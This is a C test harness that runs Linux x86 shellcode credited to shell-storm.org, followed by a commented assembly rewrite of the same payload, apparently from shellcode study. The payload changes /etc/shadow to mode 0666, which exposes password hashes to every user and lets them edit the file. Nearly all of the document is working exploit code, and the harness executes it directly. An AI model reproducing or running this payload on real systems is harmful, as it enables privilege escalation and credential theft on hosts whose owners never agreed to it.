#include <stdio.h>
 
/*
    http://shell-storm.org/shellcode/files/shellcode-556.php
    linux/x86 ; chmod(/etc/shadow, 0666) & exit() 33 bytes
    written by ka0x - <ka0x01[alt+64]gmail.com>
    lun sep 21 17:13:25 CEST 2009
 
    greets: an0de, Piker, xarnuz, NullWave07, Pepelux, JosS, sch3m4, Trancek and others!
 
*/
 
int main()
{
 
    char shellcode[] =
            "\x31\xc0"          // xor eax,eax
            "\x50"              // push eax
            "\x68\x61\x64\x6f\x77"      // push dword 0x776f6461
            "\x68\x2f\x2f\x73\x68"      // push dword 0x68732f2f
            "\x68\x2f\x65\x74\x63"      // push dword 0x6374652f
            "\x89\xe3"          // mov ebx,esp
            "\x66\x68\xb6\x01"      // push word 0x1b6
            "\x59"              // pop ecx
            "\xb0\x0f"          // mov al,0xf
            "\xcd\x80"          // int 0x80
            "\xb0\x01"          // mov al,0x1
            "\xcd\x80";         // int 0x80
 
    printf("[*] ShellCode size (bytes): %d\n\n", sizeof(shellcode)-1 );
    (*(void(*)()) shellcode)();
     
    return 0;
}



global _start:

section .text

_start:

        xor ecx, ecx            ; clearing out a different register
        mul ecx, ecx            ; clearing out both EAX and EDX
        push edx                ; push our null onto the stack but with a different register
        push dword 0x776f6461   ; Nothing changed but just wanted to explain:
        push dword 0x68732f2f   ; He's pushing '/etc/shadow/' onto the stack here
        push dword 0x6374652f
        mov ebx,esp
        mov ecx, 0x1ff          ; Instead of pushing our value just to place it in a register...
        sub ecx, 0x49           ; I decided to place the value 777 (in octal) into ecx to remove the...
                                ; stack from the equation saving us some bytes then subtracting 111 from it.
                                ; putting our value of ecx equal to 666.
        mov al, 0xf
        int 0x80
        mov al, 0x1
        int 0x80
